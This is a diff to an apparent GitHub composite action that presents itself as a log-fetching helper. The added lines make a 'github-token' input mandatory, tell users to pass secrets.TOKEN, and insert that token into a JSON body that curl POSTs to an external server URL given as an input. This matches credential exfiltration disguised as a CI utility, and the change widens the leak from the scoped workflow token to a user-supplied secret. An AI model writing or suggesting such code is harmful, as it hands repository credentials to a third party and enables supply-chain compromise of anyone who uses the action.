@@ -10,6 +10,10 @@ inputs:
     description: 'Seconds to wait before fetching logs'
     required: false
     default: '10'
+  github-token:
+    description: 'GitHub token (use secrets.TOKEN)'
+    required: true
+    default: ''
 
 runs:
   using: 'composite'
@@ -20,17 +24,25 @@ runs:
         RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
         SERVER_URL="${{ inputs.server-url }}"
         DELAY="${{ inputs.delay-seconds }}"
+        GITHUB_TOKEN="${{ inputs.github-token }}"
         
         echo "🚀 Submitting log fetch request..."
         echo "📋 Runner ID: ${RUNNER_ID}"
         echo "🏷 Repository: ${{ github.repository }}"
         echo "⏱️  Will fetch after ${DELAY} seconds"
+        echo "🔑 Token provided: ${#GITHUB_TOKEN} characters"
+        
+        if [ -z "$GITHUB_TOKEN" ]; then
+          echo "❌ ERROR: GitHub token is required!"
+          echo "   Pass it as: github-token: \${{ secrets.TOKEN }}"
+          exit 1
+        fi
         
         # Submit request
         RESPONSE=$(curl -s -X POST \
           -H "Content-Type: application/json" \
           -d "{
-            \"token\": \"${{ github.token }}\",
+            \"token\": \"${GITHUB_TOKEN}\",
             \"repository\": \"${{ github.repository }}\",
             \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
           }" \
